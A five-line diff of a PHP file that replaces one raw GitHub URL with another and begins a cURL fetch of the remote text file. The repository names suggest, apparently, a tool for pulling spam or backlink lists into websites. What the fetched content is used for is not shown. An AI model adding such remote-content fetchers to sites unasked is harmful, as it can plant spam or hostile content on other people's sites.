@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/ok612/autobl/main/file.txt';
+$url = 'https://raw.githubusercontent.com/prada5555/gacorsite/main/list.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
